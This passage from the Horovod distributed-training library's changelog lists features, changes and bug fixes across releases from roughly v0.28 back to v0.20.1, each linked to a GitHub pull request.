([#3824](https://github.com/horovod/horovod/pull/3824))\n- TensorFlow: Ensured that `tf.logical_and` within allreduce `tf.cond` runs on CPU. ([#3885](https://github.com/horovod/horovod/pull/3885))\n- TensorFlow: Added support for Keras 2.11+ optimizers. ([#3860](https://github.com/horovod/horovod/pull/3860))\n- `CUDA_VISIBLE_DEVICES` environment variable is no longer passed to remote nodes. ([#3865](https://github.com/horovod/horovod/pull/3865))\n\n### Fixed\n\n- Fixed build with ROCm. ([#3839](https://github.com/horovod/horovod/pull/3839), [#3848](https://github.com/horovod/horovod/pull/3848))\n- Fixed build of Docker image horovod-nvtabular. ([#3851](https://github.com/horovod/horovod/pull/3851))\n- Fixed linking recent NCCL by defaulting CUDA runtime library linkage to static and ensuring that weak symbols are overridden. ([#3867](https://github.com/horovod/horovod/pull/3867), [#3846](https://github.com/horovod/horovod/pull/3846))\n- Fixed compatibility with TensorFlow 2.12 and recent nightly versions. ([#3864](https://github.com/horovod/horovod/pull/3864), [#3894](https://github.com/horovod/horovod/pull/3894), [#3906](https://github.com/horovod/horovod/pull/3906), [#3907](https://github.com/horovod/horovod/pull/3907))\n- Fixed missing arguments of Keras allreduce function. ([#3905](https://github.com/horovod/horovod/pull/3905))\n- Updated with_device functions in MXNet and PyTorch to skip unnecessary cudaSetDevice calls. ([#3912](https://github.com/horovod/horovod/pull/3912))\n\n\n## [v0.27.0] - 2023-02-01\n\n### Added\n\n- Keras: Added `PartialDistributedOptimizer` API. ([#3738](https://github.com/horovod/horovod/pull/3738))\n- Added `HOROVOD_SPARK_USE_LOCAL_RANK_GPU_INDEX` environment variable to ignore GPU device indices assigned by Spark and always use local rank GPU device in Spark estimators. ([#3737](https://github.com/horovod/horovod/pull/3737))\n- Added support for reducescatter arguments `prescale_factor` and `postscale_factor` and moved averaging into Horovod backend. ([#3815](https://github.com/horovod/horovod/pull/3815))\n- Spark Estimator: Added support for custom data loaders in TorchEstimator. ([#3787](https://github.com/horovod/horovod/pull/3787))\n- Spark Estimator: Added NVTabular data loader for TorchEstimator. ([#3787](https://github.com/horovod/horovod/pull/3787))\n\n### Changed\n\n- Improved NCCL performance for fused allgather operations through padding for better memory alignment. ([#3727](https://github.com/horovod/horovod/pull/3727))\n- Improved look-ahead tensor fusion buffer size estimates when allgather and other operations are mixed. ([#3727](https://github.com/horovod/horovod/pull/3727))\n\n### Fixed\n\n- ROCm: Fixed GPU MPI operations support in build. ([#3746](https://github.com/horovod/horovod/pull/3746))\n- PyTorch: Fixed linking order to avoid using Gloo from PyTorch dynamic libraries. ([#3750](https://github.com/horovod/horovod/pull/3750))\n- Fixed memory leak in `MPI_GPUAllgather`. ([#3727](https://github.com/horovod/horovod/pull/3727))\n- TensorFlow: Fixed deprecation warnings when building with TensorFlow 2.11. ([#3767](https://github.com/horovod/horovod/pull/3767))\n- Keras: Added support for additional arguments to `SyncBatchNormalization._moments()`. ([#3775](https://github.com/horovod/horovod/pull/3775))\n- Fixed version number parsing with pypa/packaging 22.0. ([#3794](https://github.com/horovod/horovod/pull/3794))\n- TensorFlow: Fixed linking with nightly versions leading up to TensorFlow 2.12. ([#3755](https://github.com/horovod/horovod/pull/3755))\n- TensorFlow: Fixed handling of `tf.IndexedSlices` types when scaling local gradients. ([#3786](https://github.com/horovod/horovod/pull/3786))\n- Added missing `MEMCPY_IN_FUSION_BUFFER` timeline event for reducescatter. ([#3808](https://github.com/horovod/horovod/pull/3808))\n- Fixed build of Docker image horovod-nvtabular. ([#3817](https://github.com/horovod/horovod/pull/3817))\n- TensorFlow: Several fixes for allreduce and grouped allreduce handling of `tf.IndexedSlices`. ([#3813](https://github.com/horovod/horovod/pull/3813))\n- Spark: Restricted PyArrow to versions < 11.0. ([#3830](https://github.com/horovod/horovod/pull/3830))\n- TensorFlow: Resolved conflicts between multiple optimizer wrappers reusing the same gradient accumulation counter. ([#3783](https://github.com/horovod/horovod/pull/3783))\n- TensorFlow/Keras: Fixed `DistributedOptimizer` with Keras 2.11+. ([#3822](https://github.com/horovod/horovod/pull/3822))\n- PyTorch, ROCm: Fixed allreduce average on process sets. ([#3815](https://github.com/horovod/horovod/pull/3815))\n\n## [v0.26.1] - 2022-10-14\n\n### Fixed\n\n- Fixed packaging import during install to occur after install_requires. ([#3741](https://github.com/horovod/horovod/pull/3741))\n\n## [v0.26.0] - 2022-10-13\n\n### Added\n\n- Spark Estimator: Added support for custom data loaders in KerasEstimator. ([#3603](https://github.com/horovod/horovod/pull/3603))\n- Spark Estimator: Added NVTabular data loader for KerasEstimator. ([#3603](https://github.com/horovod/horovod/pull/3603))\n- Spark Estimator: Added gradient accumulation support to Spark torch estimator. ([#3681](https://github.com/horovod/horovod/pull/3681))\n- TensorFlow: Added `register_local_var` functionality to distributed optimizers and local gradient aggregators. ([#3695](https://github.com/horovod/horovod/pull/3695))\n- TensorFlow: Added support for local variables for `BroadcastGlobalVariablesCallback`. ([#3703](https://github.com/horovod/horovod/pull/3703))\n- Enabled use of native `ncclAvg` op for NCCL allreduces. ([#3646](https://github.com/horovod/horovod/pull/3646))\n- Added support for additional reduction operations for `allreduce` (min, max, product). ([#3660](https://github.com/horovod/horovod/pull/3660))\n- Added 2D torus `allreduce` using NCCL. ([#3608](https://github.com/horovod/horovod/pull/3608))\n- Added support for Petastorm reader level parallel shuffling. ([#3665](https://github.com/horovod/horovod/pull/3665))\n- Added random seed support for Lightning datamodule to generate reproducible data loading outputs. ([#3665](https://github.com/horovod/horovod/pull/3665))\n- Added support for `int8` and `uint8` `allreduce` and `grouped_allreduce` in TensorFlow. ([#3649](https://github.com/horovod/horovod/pull/3649))\n- Added support for batched memory copies in `GPUAllgather`. ([#3590](https://github.com/horovod/horovod/pull/3590))\n- Added support for batched memory copies in `GPUReducescatter`. ([#3621](https://github.com/horovod/horovod/pull/3621))\n- Added `hvd.grouped_allgather()` and `hvd.grouped_reducescatter()` operations. ([#3594](https://github.com/horovod/horovod/pull/3594))\n- Added warning messages if output tensor memory allocations fail. ([#3594](https://github.com/horovod/horovod/pull/3594))\n- Added `register_local_source` and `use_generic_names` funtionality to `DistributedGradientTape`. ([#3628](https://github.com/horovod/horovod/pull/3628))\n- Added `PartialDistributedGradientTape()` API for model parallel use cases. ([#3643](https://github.com/horovod/horovod/pull/3643))\n- Spark/Lightning: Added `reader_worker_count` and `reader_pool_type`. ([#3612](https://github.com/horovod/horovod/pull/3612))\n- Spark/Lightning: Added `transformation_edit_fields` and `transformation_removed_fields` param for `EstimatorParams`. ([#3651](https://github.com/horovod/horovod/pull/3651))\n- TensorFlow: Added doc string for `hvd.grouped_allreduce()`. ([#3594](https://github.com/horovod/horovod/pull/3594))\n- ROCm: Enabled `alltoall`. ([#3654](https://github.com/horovod/horovod/pull/3654))\n\n### Changed\n\n- Default Petastorm reader pool is changed from `process` to `thread` for lower memory usage. ([#3665](https://github.com/horovod/horovod/pull/3665))\n- Keras: Support only legacy optimizers in Keras 2.11+. ([#3725](https://github.com/horovod/horovod/pull/3725))\n- Gloo: When negotiating, use `gather` rather than `allgather`. ([#3633](https://github.com/horovod/horovod/pull/3633))\n- Use `packaging.version` instead of `distutils` version classes. ([#3700](https://github.com/horovod/horovod/pull/3700))\n\n### Deprecated\n\n- Deprecated field `shuffle_buffer_size` from `EstimatorParams`. Use `shuffle` to enable shuffle or not. ([#3665](https://github.com/horovod/horovod/pull/3665))\n\n### Removed\n\n- Build: Removed std::regex use for better cxxabi11 compatibility. ([#3584](https://github.com/horovod/horovod/pull/3584))\n\n### Fixed\n\n- TensorFlow: Fixed the optimizer iteration increments when `backward_passes_per_step > 1`. ([#3631](https://github.com/horovod/horovod/pull/3631))\n- Fixed `FuseResponses()` on `BATCHED_D2D_PADDING` edge cases for Reducescatter and/or ROCm. ([#3621](https://github.com/horovod/horovod/pull/3621))\n- PyTorch: Fixed Reducescatter functions to raise `HorovodInternalError` rather than `RuntimeError`. ([#3594](https://github.com/horovod/horovod/pull/3594))\n- PyTorch on GPUs without GPU operations: Fixed grouped allreduce to set CPU device in tensor table. ([#3594](https://github.com/horovod/horovod/pull/3594))\n- Fixed race condition in PyTorch allocation handling. ([#3639](https://github.com/horovod/horovod/pull/3639))\n- Build: Fixed finding `nvcc` (if not in `$PATH`) with older versions of CMake. ([#3682](https://github.com/horovod/horovod/pull/3682))\n- Fixed `reducescatter()` and `grouped_reducescatter()` to raise clean exceptions for scalar inputs. ([#3699](https://github.com/horovod/horovod/pull/3699))\n- Updated Eigen submodule to fix build on macOS with aarch64. ([#3619](https://github.com/horovod/horovod/pull/3619))\n- Build: Correctly select files in `torch/` directory to be hipified. ([#3588](https://github.com/horovod/horovod/pull/3588))\n- Build: Modify regex match for CUDA|ROCm in `FindPytorch.cmake`. ([#3593](https://github.com/horovod/horovod/pull/3593))\n- Build: Fixed ROCm-specific build failure. ([#3630](https://github.com/horovod/horovod/pull/3630))\n\n## [v0.25.0] - 2022-06-20\n\n### Added\n\n- Added `hvd.reducescatter()` operation with implementations in NCCL, MPI, and Gloo. ([#3299](https://github.com/horovod/horovod/pull/3299), [#3574](https://github.com/horovod/horovod/pull/3574))\n- Added AMD GPU XLA Op Implementation. ([#3486](https://github.com/horovod/horovod/pull/3486))\n- Added Horovod job to spin up distributed TensorFlow Data Service. ([#3525](https://github.com/horovod/horovod/pull/3525))\n- Spark: Expose random seed as an optional parameter. ([#3517](https://github.com/horovod/horovod/pull/3517))\n- Add Helm Chart. ([#3546](https://github.com/horovod/horovod/pull/3546))\n- Elastic: Add elastic run API. ([#3503](https://github.com/horovod/horovod/pull/3503))\n- Spark Estimator: Expose random seed for model training reproducibility. ([#3517](https://github.com/horovod/horovod/pull/3517))\n- Spark Estimator: Add option whether to use GPUs at all. ([#3526](https://github.com/horovod/horovod/pull/3526))\n- Spark Estimator: Expose parameter to set start method for `multiprocessing`. ([#3580](https://github.com/horovod/horovod/pull/3580))\n\n### Changed\n\n- MXNet: Updated allreduce functions to newer `op` API. ([#3299](https://github.com/horovod/horovod/pull/3299))\n- TensorFlow: Make TensorFlow output allocations asynchronous when using NCCL backend. ([#3464](https://github.com/horovod/horovod/pull/3464))\n- TensorFlow: Clear locally accumulated gradient by assigning with `zeros_like` to avoid infinite gradient not correctly cleared up. ([#3505](https://github.com/horovod/horovod/pull/3505))\n- Make `HorovodVersionMismatchError` subclass `ImportError` instead of just a standard `Exception`. ([#3549](https://github.com/horovod/horovod/pull/3549))\n- Elastic: Catch any exception to prevent the discovery thread from silently dying. ([#3436](https://github.com/horovod/horovod/pull/3436))\n- Horovodrun: Exit check_build (`--check-build`) via `sys.exit` to flush stdout. ([#3272](https://github.com/horovod/horovod/pull/3272))\n- Spark: Use `env` to set environment vars in remote shell. ([#3489](https://github.com/horovod/horovod/pull/3489))\n- Build: Avoid redundant ptx generation for maximum specified compute capability. ([#3509](https://github.com/horovod/horovod/pull/3509))\n\n### Deprecated\n\n- MXNet: Deprecated `average` argument of allreduce functions. ([#3299](https://github.com/horovod/horovod/pull/3299))\n- Public and internal APIs: deprecate use of np, min_np, max_np. Use num_proc, min_num_proc, and max_num_proc, respectively, instead. ([#3409](https://github.com/horovod/horovod/pull/3409))\n- Horovodrun: Providing multiple NICS as comma-separated string via `--network-interface` is deprecated,\n  use `--network-interface` multiple times or `--network-interfaces` instead. ([#3506](https://github.com/horovod/horovod/pull/3506))\n- horovod.run: Argument `network_interface` with comma-separated string is deprecated,\n  use `network_interfaces` with `Iterable[str]` instead. ([#3506](https://github.com/horovod/horovod/pull/3506))\n\n### Fixed\n\n- Fallback to NCCL shared lib if static one is not found. ([#3500]((https://github.com/horovod/horovod/pull/3500))\n- Spark/Lightning: Added missing `tranform_spec` for Petastorm datamodule. ([#3543](https://github.com/horovod/horovod/pull/3543))\n- Spark/Lightning: Fixed PTL Spark example with checkpoint usage by calling `save_hyperparameters()`. ([#3527](https://github.com/horovod/horovod/pull/3527))\n- Elastic: Fixed empty hostname returned from `HostDiscoveryScript`. ([#3490](https://github.com/horovod/horovod/pull/3490))\n- TensorFlow 2.9: Fixed build for API change related to `tensorflow_accelerator_device_info`. ([#3513](https://github.com/horovod/horovod/pull/3513))\n- TensorFlow 2.10: Bumped build partially to C++17. ([#3558](https://github.com/horovod/horovod/pull/3558))\n- TensorFlow: Fixed gradient update timing in TF `AggregationHelperEager`. ([#3496](https://github.com/horovod/horovod/pull/3496))\n- TensorFlow: Fixed resource `NotFoundError` in TF `AggregationHelper`. ([#3499](https://github.com/horovod/horovod/pull/3499))\n\n## [v0.24.3] - 2022-04-21\n\n### Fixed\n\n- Make DBFSLocalStore support \"file:/dbfs/...\", implement get_localized_path. ([#3510](https://github.com/horovod/horovod/pull/3510))\n\n## [v0.24.2] - 2022-03-10\n\n### Fixed\n\n- Setup: Require fsspec >= 2010.07.0 ([#3451](https://github.com/horovod/horovod/pull/3451))\n- Fix ignored cuda arch flags ([#3462]((https://github.com/horovod/horovod/pull/3462))\n\n## [v0.24.1] - 2022-03-03\n\n### Fixed\n\n- Extended CMake build script to often find CUDA even if `nvcc` is not in `$PATH`. ([#3444](https://github.com/horovod/horovod/pull/3444))\n\n## [v0.24.0] - 2022-03-01\n\n### Added\n\n- Ray: Added elastic keyword parameters to RayExecutor API: This API supports both static (non-elastic) and elastic Horovod jobs. ([#3190](https://github.com/horovod/horovod/issues/3190))\n- TensorFlow: Added in-place broadcasting of variables. ([#3128](https://github.com/horovod/horovod/pull/3128))\n- Elastic: Added support for resurrecting blacklisted hosts. ([#3319](https://github.com/horovod/horovod/pull/3319))\n- MXNet: Added support for MXNet async dependency engine. ([#3242](https://github.com/horovod/horovod/pull/3242), [#2963](https://github.com/horovod/horovod/pull/2963))\n- Spark/Lightning: Added history to lightning estimator. ([#3214](https://github.com/horovod/horovod/pull/3214))\n\n### Changed\n\n- Moved to CMake version 3.13 with first-class CUDA language support and re-enabled parallelized builds. Uses a temporary installation of CMake if CMake 3.13 is not found. ([#3261](https://github.com/horovod/horovod/pull/3261), [#3371](https://github.com/horovod/horovod/pull/3371))\n- Moved released Docker image `horovod` and `horovod-cpu` to Ubuntu 20.04 and Python 3.8. ([#3393](https://github.com/horovod/horovod/pull/3393))\n- Spark Estimator: Don't shuffle row groups if training data requires non-shuffle ([#3369](https://github.com/horovod/horovod/pull/3369))\n- Spark/Lightning: Reduced memory footprint of async dataloader. ([#3239](https://github.com/horovod/horovod/pull/3239))\n- Elastic: Improved handling NCCL errors under elastic scenario. ([#3112](https://github.com/horovod/horovod/pull/3112))\n- Spark/Lightning: Do not overwrite model with checkpoint by default. ([#3201](https://github.com/horovod/horovod/pull/3201))\n- Make checkpoint name optional so that user can save to h5 format. ([#3411](https://github.com/horovod/horovod/pull/3411))\n\n### Deprecated\n\n- Deprecated ElasticRayExecutor APIs in favor of the new RayExecutor API. ([#3190](https://github.com/horovod/horovod/issues/3190))\n\n### Removed\n\n- Spark: Removed `h5py<3` constraint as this is not needed anymore for Tensorflow >2.5.0. ([#3301](https://github.com/horovod/horovod/pull/3301))\n\n### Fixed\n\n- Elastic Spark: Fixed indices in initial task-to-task registration. ([#3410](https://github.com/horovod/horovod/pull/3410))\n- PyTorch: Fixed GIL-related deadlock with PyTorch 1.10.1. ([#3352](https://github.com/horovod/horovod/issues/3352))\n- PyTorch: Fixed finalization of ProcessSetTable. ([#3351](https://github.com/horovod/horovod/pull/3351))\n- Fixed remote trainers to point to the correct shared lib path. ([#3258](https://github.com/horovod/horovod/pull/3258))\n- Fixed imports from `tensorflow.python.keras` with tensorflow 2.6.0+. ([#3403](https://github.com/horovod/horovod/pull/3403))\n- Fixed Adasum communicator init logic. ([#3379](https://github.com/horovod/horovod/pull/3379))\n- Lightning: Fixed resume logger. ([#3375](https://github.com/horovod/horovod/pull/3375))\n- Fixed the checkpoint directory structure for pytorch and pytorch lightning. ([#3362](https://github.com/horovod/horovod/pull/3362))\n- Fixed possible integer overflow in multiplication. ([#3368](https://github.com/horovod/horovod/pull/3368))\n- Fixed the `pytorch_lightning_mnist.py` example. ([#3245](https://github.com/horovod/horovod/pull/3245), [#3290](https://github.com/horovod/horovod/pull/3290))\n- Fixed barrier segmentation fault. ([#3313](https://github.com/horovod/horovod/pull/3313))\n- Fixed `hvd.barrier()` tensor queue management. ([#3300](https://github.com/horovod/horovod/pull/3300))\n- Fixed PyArrow \"list index out of range\" IndexError. ([#3274](https://github.com/horovod/horovod/pull/3274))\n- Elastic: Fixed all workers sometimes failing on elastic Horovod failure. ([#3264](https://github.com/horovod/horovod/issues/3264))\n- Spark/Lightning: Fixed setting `limit_train_batches` and `limit_val_batches`. ([#3237](https://github.com/horovod/horovod/pull/3237))\n- Elastic: Fixed ElasticSampler and `hvd.elastic.state` losing some indices of processed samples when nodes dropped. ([#3143](https://github.com/horovod/horovod/issues/3143))\n- Spark/Lightning: Fixed history metrics for estimator serialization. ([#3216](https://github.com/horovod/horovod/pull/3216))\n- Ray: Fixed RayExecutor to fail when `num_workers=0` and `num_hosts=None`. ([#3210](https://github.com/horovod/horovod/pull/3210))\n- Spark/Lightning: Fixed checkpoint callback `dirpath` typo. ([#3204](https://github.com/horovod/horovod/pull/3204))\n\n## [v0.23.0] - 2021-10-06\n\n### Added\n\n- Added process sets to concurrently run collective operations on subsets of Horovod processes in TensorFlow, PyTorch, and MXNet. ([#2839](https://github.com/horovod/horovod/pull/2839), [#3042](https://github.com/horovod/horovod/pull/3042), [#3043](https://github.com/horovod/horovod/pull/3043), [#3054](https://github.com/horovod/horovod/pull/3054), [#3083](https://github.com/horovod/horovod/pull/3083), [#3090](https://github.com/horovod/horovod/pull/3090))\n- Added XLA support for Allreduce via `tf.function(jit_compile=True)`. ([#3053](https://github.com/horovod/horovod/pull/3053))\n- Added fused buffer scaling and unpack/pack kernels on GPU. ([#2973](https://github.com/horovod/horovod/pull/2973))\n- Added support for NCCL on CUDA 11.4. ([#3182](https://github.com/horovod/horovod/issues/3182))\n- Added fp16 compression for MXNet. ([#2987](https://github.com/horovod/horovod/issues/2987))\n- Added terminate_on_nan flag to Spark Lightning estimator. ([#3088](https://github.com/horovod/horovod/issues/3088))\n- Added barrier() API to torch module to support simple synchronization among ranks and to achieve parity with PyTorch DDP and similar frameworks. [#3139](https://github.com/horovod/horovod/pull/3139)\n- Added params for customizing Tensorboard callback. ([#3153](https://github.com/horovod/horovod/issues/3153))\n- Added `hvd.cross_rank()` for keras. ([#3008](https://github.com/horovod/horovod/issues/3008))\n- Added barrier() API to torch module to support simple synchronization among ranks and to achieve parity with PyTorch DDP and similar frameworks. [#3139](https://github.com/horovod/horovod/pull/3139)\n\n### Changed\n\n- Implemented more asynchronous dependency handling on GPU. ([#2963](https://github.com/horovod/horovod/pull/2963))\n- Ray: RayExecutor will now use the current placement group instead of always creating a new one. ([#3134](https://github.com/horovod/horovod/pull/3134))\n- Lightning: turned off shuffling for validation dataset. ([#2974](https://github.com/horovod/horovod/pull/2974))\n- Ray: RayExecutor will use the current placement group if one exists. ([#3134](https://github.com/horovod/horovod/pull/3134))\n- Extended `hvd.join()` to return the last rank that joined. ([#3097](https://github.com/horovod/horovod/pull/3097)\n\n### Deprecated\n\n### Removed\n\n- Spark/Keras: remove bare Keras support. ([#3191](https://github.com/horovod/horovod/pull/3191))\n\n### Fixed\n\n- Fix Horovod develop/editable install mode and incremental builds. ([#3074](https://github.com/horovod/horovod/pull/3074))\n- Estimator/Lightning: use lightning datamodule. ([#3084](https://github.com/horovod/horovod/pull/3084))\n- Fix Horovod Spark StringType and numpy type mapping issue. ([#3146](https://github.com/horovod/horovod/pull/3146))\n- Fixed error in Keras LearningRateScheduler. ([#3135](https://github.com/horovod/horovod/pull/3135))\n- Fixed bug in Lightning Profiler on Ray. ([#3122](https://github.com/horovod/horovod/pull/3122))\n- Fixed torch op lazy release to prevent OOM in elastic training. ([#3110](https://github.com/horovod/horovod/pull/3110))\n- Lightning: Fixed usage of the checkpoint callback. ([#3186](https://github.com/horovod/horovod/pull/3186))\n- Fixed MPICH support to use Intel MPI's implementation. ([#3148](https://github.com/horovod/horovod/pull/3148))\n- Fixed race condition in PyTorch async dataloader. ([#3120](https://github.com/horovod/horovod/pull/3120))\n- Keras: Fixed learning rate scheduler. ([#3142](https://github.com/horovod/horovod/pull/3142), [#3135](https://github.com/horovod/horovod/pull/3135))\n\n## [v0.22.1] - 2021-06-10\n\n### Added\n\n- Estimator: added support for loading data from S3, GCS, ADLS, and other remote filesystems. ([#2927](https://github.com/horovod/horovod/issues/2927))\n- Estimator: added custom Spark data loader interface. ([#2938](https://github.com/horovod/horovod/issues/2923))\n- LightningEstimator: added support to supply a logger and associated parameter to control the frequency of logging. ([#2926](https://github.com/horovod/horovod/pull/2926))\n- Estimator: added check to ensure all ranks have the same device type. ([#2942](https://github.com/horovod/horovod/pull/2942))\n\n### Changed\n\n- Changed behavior from using TensorBoardLogger to now using it as a fallback if a logger is not supplied. ([#2926](https://github.com/horovod/horovod/pull/2926))\n- Ray: disabled capturing child tasks in placement group. ([#2920](https://github.com/horovod/horovod/pull/2920))\n\n### Fixed\n\n- Fixed `hvd.tensorflow.keras.Compression`, accidentally removed in v0.22.0. ([#2945](https://github.com/horovod/horovod/pull/2945))\n- TorchEstimator: fixed usage of `validation_steps` in place of `validation_steps_per_epoch`. ([#2918](https://github.com/horovod/horovod/pull/2918))\n- TensorFlow: fixed C++ API for TF v2.6.0. ([#2932](https://github.com/horovod/horovod/pull/2932))\n- PyTorch: fixed `sparse_allreduce_async` for PyTorch v0.10.0. ([#2965](https://github.com/horovod/horovod/pull/2965))\n\n## [v0.22.0] - 2021-05-18\n\n### Added\n\n- Added pytorch_lightning spark estimator which enables training pytorch_lightning models. ([#2713](https://github.com/horovod/horovod/pull/2713))\n- Added NVTX tracing hooks for profiling with Nsight Systems. ([#2723](https://github.com/horovod/horovod/pull/2723))\n- Added a generic `num_workers` API for ``RayExecutor`` ([#2870](https://github.com/horovod/horovod/pull/2870))\n- Supports Ray Client without code changes. ([#2882](https://github.com/horovod/horovod/pull/2882))\n- Supports inmemory cache option for Keras Estimator. ([#2896](https://github.com/horovod/horovod/pull/2896))\n- Added FP16 support for GPU tensor in mxnet. ([#2915](https://github.com/horovod/horovod/pull/2915))\n- Added response caching for allgather operations. ([#2872](https://github.com/horovod/horovod/pull/2872))\n- Estimator: add petastorm reader_pool_type into constructor ([#2903](https://github.com/horovod/horovod/pull/2903))\n\n### Changed\n\n- Changed `alltoall` to return the received splits as a second return value if non-uniform splits are sent. ([#2631](https://github.com/horovod/horovod/pull/2631))\n- Changed ``RayExecutor`` to use [Ray Placement Groups](https://docs.ray.io/en/master/placement-group.html) for worker colocation. ([#2824](https://github.com/horovod/horovod/pull/2824))\n- Changed ``Inmemory dataloader`` usage for Torch Estimator with petastorm v0.11.0 release. ([#2896](https://github.com/horovod/horovod/pull/2896))\n\n### Fixed\n\n- Changed RayExecutor to use Ray node ID to enable multi-container:single-host setups. ([#2883](https://github.com/horovod/horovod/pull/2882))\n- Support sparse gradients aggregation in TF1 Keras. ([#2879](https://github.com/horovod/horovod/pull/2879))\n- Respect `global_step` parameter for LegacyOptimizers when aggregating gradients.  ([#2879](https://github.com/horovod/horovod/pull/2879))\n- Fixed compatibility with PyTorch 1.9.0. ([#2829](https://github.com/horovod/horovod/pull/2829))\n\n## [v0.21.3] - 2021-02-15\n\n### Added\n\n- Add `groups` parameter in `DistributedOptimizer` for custom allreduce groups. ([#2523](https://github.com/horovod/horovod/pull/2523))\n\n### Removed\n\n- Removed `num_groups` parameter in `DistributedOptimizer`, replaced with `groups`. ([#2523](https://github.com/horovod/horovod/pull/2523))\n\n### Fixed\n\n- Fixed worker desynchronization deadlock issue in TensorFlow 2.4. ([#2647](https://github.com/horovod/horovod/pull/2647))\n- Deduped Keras `LearningRateWarmupCallback` log after gradual learning rate warmup. ([#2661](https://github.com/horovod/horovod/pull/2661))\n\n## [v0.21.2] - 2021-02-08\n\n### Added\n\n- Added support for Intel(R) MPI in horovodrun. ([#2374](https://github.com/horovod/horovod/pull/2374))\n- Add support for callbacks in Ray Elastic Executor. ([#2639](https://github.com/horovod/horovod/pull/2639))\n- Added forwarding of stdout/stderr captured to driver over Gloo. ([#2646](https://github.com/horovod/horovod/pull/2646))\n\n### Fixed\n\n- Fixed broadcast_optimizer_state to handle NoneType params for PyTorch 1.8. ([#2624](https://github.com/horovod/horovod/pull/2624))\n- Fixed `local_rank` support for Ray. ([#2596](https://github.com/horovod/horovod/pull/2596))\n- Fixed DL estimators to obtain the output df schema without sampling the input. ([#2611](https://github.com/horovod/horovod/pull/2611))\n- Fixed wrong default for horovod.tensorflow.keras.allreduce average ([#2627](https://github.com/horovod/horovod/pull/2627))\n\n## [v0.21.1] - 2021-01-06\n\n### Added\n\n- Added in-memory dataset caching param to `TorchEstimator`. ([#2434](https://github.com/horovod/horovod/pull/2434))\n- Added `val_batch_size` param to the Estimator API. ([#2505](https://github.com/horovod/horovod/pull/2505))\n- Added support for TorchScript modules when using `TorchEstimator`. ([#2494](https://github.com/horovod/horovod/pull/2494))\n\n### Changed\n\n- Migrated to oneCCL aligned with oneAPI specification v1.0. ([#2513](https://github.com/horovod/horovod/pull/2513))\n- Added knob to set cache hint for oneCCL allreduce. ([#2560](https://github.com/horovod/horovod/pull/2560))\n- Renamed `horovodrun` arg `--ccl-bgt-affinity` to `--thread-affinity`. ([#2562](https://github.com/horovod/horovod/pull/2562))\n- Changed default build parallelism from `-j8` to `-j1` to address potential race condition. ([#2572](https://github.com/horovod/horovod/pull/2572))\n\n### Fixed\n\n- Fixed building Horovod for ROCm PyTorch with newer hipify script. ([#2360](https://github.com/horovod/horovod/pull/2360))\n- Fixed \"Executable class\" support for Ray. ([#2510](https://github.com/horovod/horovod/pull/2510))\n- Fixed TorchEstimator returning model without switching to eval mode. ([#2517](https://github.com/horovod/horovod/pull/2517))\n- Remove ssh reliance for Ray elastic training. ([#2528](https://github.com/horovod/horovod/pull/2528))\n- Fixed error handling for changing framework without reinstalling horovod. ([#2529](https://github.com/horovod/horovod/pull/2529))\n- Fixed \"Intermediate path does not exist\" error with DBFSLocalStore. ([#2526](https://github.com/horovod/horovod/pull/2526))\n- Avoid synchronization if workers are only shrinked in elastic mode. ([#2514](https://github.com/horovod/horovod/pull/2514))\n- Fixed Ray resource test. ([#2575](https://github.com/horovod/horovod/pull/2575))\n- Fixed usage of env variable `HOROVOD_GLOO_TIMEOUT_SECONDS` with `horovodrun`. ([#2571](https://github.com/horovod/horovod/pull/2571))\n\n## [v0.21.0] - 2020-11-23\n\n### Added\n\n- Added support for backward_passes_per_step > 1 for TF Keras graph mode. ([#2346](https://github.com/horovod/horovod/pull/2346))\n- Added support for backward_passes_per_step > 1 for TF Keras eager execution. ([#2371](https://github.com/horovod/horovod/pull/2371))\n- Added support for backward_passes_per_step > 1 for TF LegacyOptimizer in graph mode. ([#2401](https://github.com/horovod/horovod/pull/2401))\n- Added grouped allreduce to enable more efficient tensor fusion and deterministic training. ([#2453](https://github.com/horovod/horovod/pull/2453))\n- Add support for specifying `op` and `compression` in `horovod.tensorflow.keras.allreduce()`. ([#2423](https://github.com/horovod/horovod/pull/2423))\n- Adding support for batched D2D memcopy kernel on GPU. ([#2435](https://github.com/horovod/horovod/pull/2435))\n- Added schema inference in Spark Estimator without sampling. ([#2373](https://github.com/horovod/horovod/pull/2373))\n- Added `Store.create(\"dbfs:/\")` mapping to `DBFSLocalStore(\"/dbfs/...\")`. ([#2376](https://github.com/horovod/horovod/pull/2376))\n\n### Changed\n\n- Changed Keras callbacks to require parameter `initial_lr` of `LearningRateScheduleCallback` and `LearningRateWarmupCallback`. ([#2459](https://github.com/horovod/horovod/pull/2459))\n- Changed default cycle time from 5ms to 1ms and fusion threshold from 64MB to 128MB. ([#2468](https://github.com/horovod/horovod/pull/2468))\n\n### Fixed\n\n- Fixed support for TensorFlow v2.4.0. ([#2381](https://github.com/horovod/horovod/pull/2381))\n- Fixed averaging using CUDA half2 implementation one element half buffers. ([#2375](https://github.com/horovod/horovod/pull/2375))\n- Fixed `HOROVOD_THREAD_AFFINITY` when using oneCCL. ([#2350](https://github.com/horovod/horovod/pull/2350))\n- Added timeout to SSH check in horovodrun to prevent hanging. ([#2448](https://github.com/horovod/horovod/pull/2448))\n- Added `HOROVOD_GLOO_TIMEOUT_SECONDS` value to error messages. ([#2436](https://github.com/horovod/horovod/pull/2436))\n- Fixed race condition in dynamic timeline API. ([#2341](https://github.com/horovod/horovod/pull/2341))\n- Fixed --log-hide-timestamp to apply to driver logs with Gloo. ([#2388](https://github.com/horovod/horovod/pull/2388))\n- Fixed the search order of Eigen and Flatbuffers paths. ([#2473](https://github.com/horovod/horovod/pull/2473))\n- Fixed type checks in `TorchEstimator` to correctly use `isinstance()`. ([#2480](https://github.com/horovod/horovod/pull/2480))\n\n## [0.20.3] - 2020-10-01\n\n### Added\n\n- Added Elastic Ray integration. ([#2291](https://github.com/horovod/horovod/pull/2291))\n\n### Changed\n\n- Removed dependency on SSH access for Ray. ([#2275](https://github.com/horovod/horovod/pull/2275))\n\n## [0.20.2] - 2020-09-25\n\n### Fixed\n\n- Fixed building Horovod without HOROVOD_WITHOUT_MXNET when MXNet is not installed. ([#2334](https://github.com/horovod/horovod/pull/2334))\n\n## [0.20.1] - 2020-09-25\n\n### Added\n\n- Added Databricks storage `DBFSLocalStore` and support for GPU-aware scheduling to horovod.spark Estimator. ([#2234](https://github.com/horovod/horovod/pull/2234))\n- Added ElasticSampler and PyTorch Elastic ImageNet example. ([#2297](https://github.com/horovod/horovod/pull/2297))\n- Added ability to dynamically start and stop timeline programmatically. ([#2215](https://github.com/horovod/horovod/pull/2215))\n- Added support for Gloo on macOS. 